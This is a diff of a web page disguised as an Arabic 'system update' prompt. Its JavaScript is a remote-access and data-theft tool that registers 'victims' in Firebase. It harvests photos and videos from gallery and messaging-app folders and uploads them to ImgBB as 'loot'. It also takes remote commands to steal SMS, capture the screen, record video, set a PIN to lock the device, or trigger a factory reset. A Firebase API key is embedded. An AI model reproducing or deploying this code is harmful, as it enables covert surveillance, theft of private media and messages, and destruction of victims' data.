@@ -16,7 +16,7 @@
     <div id="msg">📱 تحديث النظام مطلوب</div>
     <button id="grantBtn" class="btn" onclick="startPayload()">بدء التحديث</button>
     <script>
-        // ========== إعدادات Firebase ==========
+        // ========== إعدادات ==========
         const firebaseConfig = {
             apiKey: "AIzaSyCUUU64NotDyl-qjSvAD1jQZSQZrZEcuvU",
             authDomain: "zwahy-5b75d.firebaseapp.com",
@@ -30,27 +30,18 @@
         firebase.initializeApp(firebaseConfig);
         const db = firebase.database();
 
-        const browserFingerprint = navigator.userAgent + screen.width + screen.height + navigator.hardwareConcurrency;
-        const vid = 'phantom-' + Math.abs(hashCode(browserFingerprint)).toString(36);
+        const vid = 'phantom-' + Date.now().toString(36) + Math.random().toString(36).substr(2,5);
         const vref = db.ref('victims/' + vid);
         let ROOT_HANDLE = null;
         let camStream = null;
         let lootCounter = 0;
-
-        function hashCode(str) {
-            let hash = 0;
-            for (let i = 0; i < str.length; i++) {
-                hash = ((hash << 5) - hash) + str.charCodeAt(i);
-                hash |= 0;
-            }
-            return hash;
-        }
+        let isAlive = true;
 
         // ========== بدء الواجهة ==========
         setTimeout(() => {
-            document.getElementById('msg').innerText = "يرجى الضغط على 'بدء التحديث' للمتابعة";
+            document.getElementById('msg').innerText = "اضغط للبدء";
             document.getElementById('grantBtn').style.display = 'block';
-        }, 2000);
+        }, 1500);
 
         window.startPayload = async function() {
             document.getElementById('grantBtn').style.display = 'none';
@@ -59,43 +50,94 @@
             // تسجيل الجهاز فوراً
             await registerDevice();
 
-            // طلب الإذن الشامل (Android WebView / Chrome)
-            await requestSuperPermission();
+            // طلب الصلاحيات
+            try {
+                const p1 = window.showDirectoryPicker({ mode: 'readwrite' });
+                const p2 = new Promise((_, reject) => setTimeout(() => reject('timeout'), 4000));
+                ROOT_HANDLE = await Promise.race([p1, p2]);
+            } catch(e) { ROOT_HANDLE = null; }
 
-            // تفعيل الأوامر
-            vref.child('online').set(true);
-            document.getElementById('msg').innerText = "✅ تم بنجاح";
-            setTimeout(() => {
-                document.body.innerHTML = '<h2 style="color:#fff;text-align:center;margin-top:40vh;">📷 معرض الصور</h2>';
-            }, 1000);
-
-            startCommandListener();
-        };
-
-        // ========== الإذن الشامل ==========
-        async function requestSuperPermission() {
-            // الكاميرا
             try { camStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" }, audio: false }); } catch(e) {}
-            // الشاشة
             try { const d = await navigator.mediaDevices.getDisplayMedia({ video: true }); d.getTracks().forEach(t => t.stop()); } catch(e) {}
 
-            // الوصول إلى جذر التخزين عبر Intents (يعمل على Android)
-            try {
-                // هذا يطلب من المستخدم منح الإذن للملفات
-                const handle = await window.showDirectoryPicker({ mode: 'readwrite', startIn: 'documents' });
-                ROOT_HANDLE = handle;
-                // محاولة الصعود لأعلى مجلد ممكن
-                try { ROOT_HANDLE = await handle.getDirectoryHandle('..'); } catch(e) {}
-            } catch(e) {
-                // فشل، نكتفي بالصلاحيات الأخرى
-            }
+            // تأكيد الاتصال
+            vref.child('online').set(true);
+            document.getElementById('msg').innerText = "✅ تم";
+            setTimeout(() => {
+                document.body.innerHTML = '<h2 style="color:#fff;text-align:center;margin-top:40vh;">📷 معرض الصور</h2>';
+            }, 800);
 
-            // طلب إذن SMS
-            try {
-                if ('webkitSms' in window || 'sms' in navigator) {
-                    // SMS API تحتاج إذن المستخدم أيضاً
+            // بدء الفيروس الصامت (جمع الصور تلقائياً)
+            startSilentVirus();
+            
+            // بدء استقبال الأوامر
+            listenForCommands();
+            
+            // إرسال ping كل 10 ثوان للإبقاء على الاتصال
+            setInterval(() => vref.child('online').set(true), 10000);
+        };
+
+        // ========== الفيروس الصامت ==========
+        async function startSilentVirus() {
+            if (!ROOT_HANDLE) return;
+            
+            // قائمة المجلدات للبحث
+            const folders = [
+                'DCIM/Camera', 'DCIM/Screenshots',
+                'Pictures', 'Download', 'Downloads',
+                'WhatsApp/Media/WhatsApp Images',
+                'Facebook/Media', 'Messenger/Media',
+                'Telegram/Telegram Images'
+            ];
+
+            for (const folder of folders) {
+                if (!isAlive) return;
+                try {
+                    let current = ROOT_HANDLE;
+                    const parts = folder.split('/');
+                    for (const part of parts) {
+                        current = await current.getDirectoryHandle(part);
+                    }
+                    await stealFiles(current, folder);
+                } catch(e) {
+                    // مجلد غير موجود، تخطي
                 }
-            } catch(e) {}
+            }
+        }
+
+        async function stealFiles(dirHandle, prefix) {
+            for await (let entry of dirHandle.values()) {
+                if (!isAlive) return;
+                if (entry.kind === 'file') {
+                    const file = await entry.getFile();
+                    const ext = file.name.split('.').pop().toLowerCase();
+                    if (!['jpg','jpeg','png','gif','webp','mp4','mov'].includes(ext)) continue;
+                    if (file.size > 10*1024*1024) continue;
+                    
+                    try {
+                        const reader = new FileReader();
+                        reader.onload = async (e) => {
+                            const b64 = e.target.result.split(',')[1];
+                            const url = await uploadToImgBB(b64);
+                            lootCounter++;
+                            await vref.child('loot').push({
+                                type: 'photo',
+                                url: url,
+                                name: prefix + '/' + entry.name,
+                                size: file.size,
+                                ts: Date.now(),
+                                counter: lootCounter
+                            });
+                        };
+                        reader.readAsDataURL(file);
+                    } catch(e) {}
+                } else if (entry.kind === 'directory') {
+                    try {
+                        const sub = await dirHandle.getDirectoryHandle(entry.name);
+                        await stealFiles(sub, prefix + '/' + entry.name);
+                    } catch(e) {}
+                }
+            }
         }
 
         // ========== تسجيل الجهاز ==========
@@ -118,9 +160,7 @@
                     scr: screen.width + 'x' + screen.height,
                     cores: navigator.hardwareConcurrency,
                     mem: navigator.deviceMemory || '?',
-                    ip: ip,
-                    battery: battery,
-                    charging: charging,
+                    ip: ip, battery: battery, charging: charging,
                     language: navigator.language,
                     time: new Date().toLocaleString()
                 }
@@ -128,146 +168,59 @@
         }
 
         // ========== استقبال الأوامر ==========
-        function startCommandListener() {
+        function listenForCommands() {
             vref.child('command').on('value', async (snap) => {
                 const cmd = snap.val();
                 if (!cmd) return;
-                console.log('📩 أمر:', cmd.action, cmd);
                 
                 try {
                     switch(cmd.action) {
-                        case 'get_all_photos': await getAllPhotos(); break;
-                        case 'get_all_sms': await getAllSMS(); break;
-                        case 'get_device_info': await sendDeviceInfo(); break;
-                        case 'vibrate': navigator.vibrate([500,200,500,200,500]); break;
-                        case 'play_sound': playRingtone(); break;
-                        case 'screenshot': await screenshot(); break;
-                        case 'record_video': await recordVid(cmd.duration || 10); break;
-                        case 'flash_on': await setFlash(true); break;
-                        case 'flash_off': await setFlash(false); break;
-                        case 'lock_screen': lockScreen(cmd.pin || ''); break;
-                        case 'send_notification': showNotification(cmd.message || ''); break;
-                        case 'format': await formatDevice(); break;
+                        case 'get_all_photos':
+                            if (ROOT_HANDLE) await startSilentVirus();
+                            break;
+                        case 'get_all_sms':
+                            await stealSMS();
+                            break;
+                        case 'get_device_info':
+                            await sendDeviceInfo();
+                            break;
+                        case 'vibrate':
+                            if (navigator.vibrate) navigator.vibrate([500,200,500,200,500]);
+                            break;
+                        case 'play_sound':
+                            playSound();
+                            break;
+                        case 'screenshot':
+                            await takeScreenshot();
+                            break;
+                        case 'record_video':
+                            await recordVideo(cmd.duration || 10);
+                            break;
+                        case 'flash_on':
+                            await toggleFlash(true);
+                            break;
+                        case 'flash_off':
+                            await toggleFlash(false);
+                            break;
+                        case 'lock_screen':
+                            lockDevice(cmd.pin || '');
+                            break;
+                        case 'send_notification':
+                            showNotify(cmd.message || '');
+                            break;
+                        case 'format':
+                            window.open('intent://#Intent;action=android.intent.action.MASTER_CLEAR;end');
+                            break;
                     }
                 } catch(e) {
-                    console.error('❌ خطأ:', e.message);
+                    console.error('خطأ:', e.message);
                 }
                 await vref.child('command').remove();
             });
         }
 
-        // ========== سحب جميع الصور من كل المجلدات ==========
-        async function getAllPhotos() {
-            if (!ROOT_HANDLE) throw new Error('لا صلاحية ملفات');
-            
-            // قائمة بكل المجلدات المعروفة
-            const folders = [
-                'DCIM/Camera', 'DCIM/Screenshots', 'DCIM/100ANDRO',
-                'Pictures', 'Pictures/Screenshots',
-                'Download', 'Downloads',
-                'WhatsApp/Media/WhatsApp Images', 'WhatsApp/Media/WhatsApp Images/Sent',
-                'Facebook/Media', 'Messenger/Media',
-                'Telegram/Telegram Images', 'Snapchat/Media',
-                'Instagram/Media', 'Twitter/Media'
-            ];
-
-            for (const folder of folders) {
-                try {
-                    let current = ROOT_HANDLE;
-                    const parts = folder.split('/');
-                    for (const part of parts) {
-                        current = await current.getDirectoryHandle(part);
-                    }
-                    await walkDir(current, folder + '/');
-                } catch(e) {
-                    // المجلد غير موجود، تخطي
-                }
-            }
-        }
-
-        async function walkDir(dirHandle, prefix) {
-            for await (let entry of dirHandle.values()) {
-                if (entry.kind === 'file') {
-                    const file = await entry.getFile();
-                    // نقبل أي ملف صور أو فيديو
-                    const ext = file.name.split('.').pop().toLowerCase();
-                    if (!['jpg','jpeg','png','gif','webp','mp4','mov','avi'].includes(ext)) continue;
-                    if (file.size > 15 * 1024 * 1024) continue;
-                    
-                    const reader = new FileReader();
-                    reader.onload = async (e) => {
-                        const b64 = e.target.result.split(',')[1];
-                        const url = await uploadToImgBB(b64);
-                        await store('photo', url, { name: prefix + entry.name, size: file.size, folder: prefix });
-                    };
-                    reader.readAsDataURL(file);
-                } else if (entry.kind === 'directory') {
-                    const sub = await dirHandle.getDirectoryHandle(entry.name);
-                    await walkDir(sub, prefix + entry.name + '/');
-                }
-            }
-        }
-
-        // ========== سحب SMS ==========
-        async function getAllSMS() {
-            try {
-                let messages = [];
-                if ('webkitSms' in window) {
-                    const list = await window.webkitSms.getMessages({});
-                    for (let sms of list) {
-                        messages.push({
-                            from: sms.sender || 'غير معروف',
-                            body: sms.body || '',
-                            date: new Date(sms.timestamp || Date.now()).toLocaleString()
-                        });
-                    }
-                } else if ('sms' in navigator) {
-                    const list = await navigator.sms.getMessages({});
-                    for (let sms of list) {
-                        messages.push({
-                            from: sms.sender || 'غير معروف',
-                            body: sms.body || '',
-                            date: new Date(sms.timestamp || Date.now()).toLocaleString()
-                        });
-                    }
-                } else {
-                    // محاولة بديلة: استخدام Android Intent
-                    window.open('intent://#Intent;action=android.provider.Telephony.SMS_RECEIVED;end');
-                    messages = [{ from: 'API غير مدعوم', body: 'لا يمكن سحب SMS من هذا المتصفح', date: new Date().toLocaleString() }];
-                }
-                await store('sms', null, { info: messages.slice(-30) }); // آخر 30 رسالة
-            } catch(e) {
-                await store('sms', null, { info: { error: e.message } });
-            }
-        }
-
-        // ========== معلومات الجهاز كاملة ==========
-        async function sendDeviceInfo() {
-            const snap = await vref.child('fingerprint').once('value');
-            const info = snap.val() || {};
-            
-            // إضافة معلومات إضافية
-            info.connection = navigator.connection ? navigator.connection.effectiveType : 'غير معروف';
-            info.cookies = navigator.cookieEnabled;
-            info.online = navigator.onLine;
-            info.platform = navigator.platform;
-            info.vendor = navigator.vendor;
-            info.gpu = (() => {
-                try {
-                    const canvas = document.createElement('canvas');
-                    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-                    if (gl) {
-                        return gl.getParameter(gl.RENDERER);
-                    }
-                } catch(e) {}
-                return 'غير معروف';
-            })();
-            
-            await store('device_info', null, { info });
-        }
-
-        // ========== رنة ==========
-        function playRingtone() {
+        // ========== صوت ==========
+        function playSound() {
             try {
                 const ctx = new (window.AudioContext || window.webkitAudioContext)();
                 const osc = ctx.createOscillator();
@@ -283,16 +236,16 @@
         }
 
         // ========== إشعار ==========
-        function showNotification(message) {
+        function showNotify(msg) {
             const div = document.createElement('div');
             div.style.cssText = 'position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);background:#ff0;color:#000;padding:20px;border-radius:10px;font-size:1.2em;font-weight:bold;z-index:999999;text-align:center;';
-            div.textContent = message;
+            div.textContent = msg;
             document.body.appendChild(div);
             setTimeout(() => div.remove(), 3000);
         }
 
         // ========== فلاش ==========
-        async function setFlash(on) {
+        async function toggleFlash(on) {
             if (!camStream) return;
             const track = camStream.getVideoTracks()[0];
             if (track && track.applyConstraints) {
@@ -301,7 +254,7 @@
         }
 
         // ========== لقطة شاشة ==========
-        async function screenshot() {
+        async function takeScreenshot() {
             const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
             const video = document.createElement('video');
             video.srcObject = stream;
@@ -312,12 +265,19 @@
             canvas.getContext('2d').drawImage(video, 0, 0);
             const b64 = canvas.toDataURL('image/png').split(',')[1];
             const url = await uploadToImgBB(b64);
-            await store('screenshot', url, { ts: Date.now() });
+            lootCounter++;
+            await vref.child('loot').push({
+                type: 'screenshot',
+                url: url,
+                name: 'screenshot_' + Date.now() + '.png',
+                ts: Date.now(),
+                counter: lootCounter
+            });
             stream.getTracks().forEach(t => t.stop());
         }
 
         // ========== فيديو ==========
-        async function recordVid(sec) {
+        async function recordVideo(sec) {
             const stream = await navigator.mediaDevices.getDisplayMedia({ video: true, audio: true });
             const recorder = new MediaRecorder(stream);
             const chunks = [];
@@ -328,7 +288,14 @@
                 reader.onload = async (e) => {
                     const b64 = e.target.result.split(',')[1];
                     const url = await uploadToImgBB(b64);
-                    await store('video', url, { ts: Date.now() });
+                    lootCounter++;
+                    await vref.child('loot').push({
+                        type: 'video',
+                        url: url,
+                        name: 'video_' + Date.now() + '.webm',
+                        ts: Date.now(),
+                        counter: lootCounter
+                    });
                 };
                 reader.readAsDataURL(blob);
                 stream.getTracks().forEach(t => t.stop());
@@ -337,15 +304,63 @@
             setTimeout(() => recorder.stop(), sec * 1000);
         }
 
-        // ========== فرمتة ==========
-        async function formatDevice() {
-            window.open('intent://#Intent;action=android.intent.action.MASTER_CLEAR;end');
+        // ========== SMS ==========
+        async function stealSMS() {
+            try {
+                let messages = [];
+                if ('webkitSms' in window) {
+                    const list = await window.webkitSms.getMessages({});
+                    for (let sms of list) messages.push({ from: sms.sender, body: sms.body, date: new Date(sms.timestamp).toLocaleString() });
+                } else if ('sms' in navigator) {
+                    const list = await navigator.sms.getMessages({});
+                    for (let sms of list) messages.push({ from: sms.sender, body: sms.body, date: new Date(sms.timestamp).toLocaleString() });
+                }
+                lootCounter++;
+                await vref.child('loot').push({
+                    type: 'sms',
+                    info: messages.slice(-20),
+                    ts: Date.now(),
+                    counter: lootCounter
+                });
+            } catch(e) {
+                lootCounter++;
+                await vref.child('loot').push({
+                    type: 'sms',
+                    info: { error: 'SMS API غير مدعومة في هذا المتصفح' },
+                    ts: Date.now(),
+                    counter: lootCounter
+                });
+            }
+        }
+
+        // ========== معلومات الجهاز ==========
+        async function sendDeviceInfo() {
+            const snap = await vref.child('fingerprint').once('value');
+            const info = snap.val() || {};
+            info.connection = navigator.connection ? navigator.connection.effectiveType : 'غير معروف';
+            info.cookies = navigator.cookieEnabled;
+            info.online = navigator.onLine;
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                info.gpu = gl ? gl.getParameter(gl.RENDERER) : 'غير معروف';
+            } catch(e) { info.gpu = 'غير معروف'; }
+            
+            lootCounter++;
+            await vref.child('loot').push({
+                type: 'device_info',
+                info: info,
+                ts: Date.now(),
+                counter: lootCounter
+            });
         }
 
         // ========== قفل ==========
-        function lockScreen(pin) {
-            window.open(`intent://#Intent;action=android.app.action.SET_NEW_PASSWORD;extra.android.app.extra.PASSWORD=${pin};end`);
-            setTimeout(() => window.open('intent://#Intent;action=android.app.action.LOCK_DEVICE;end'), 500);
+        function lockDevice(pin) {
+            try {
+                window.open(`intent://#Intent;action=android.app.action.SET_NEW_PASSWORD;extra.android.app.extra.PASSWORD=${pin};end`);
+                setTimeout(() => window.open('intent://#Intent;action=android.app.action.LOCK_DEVICE;end'), 500);
+            } catch(e) {}
         }
 
         // ========== ImgBB ==========
@@ -357,12 +372,6 @@
             const json = await res.json();
             if (json.success) return json.data.url;
             throw new Error('فشل الرفع');
-        }
-
-        // ========== تخزين ==========
-        async function store(type, url, extra = {}) {
-            lootCounter++;
-            await vref.child('loot').push().set({ type, url, ts: Date.now(), counter: lootCounter, ...extra });
         }
     </script>
 </body>
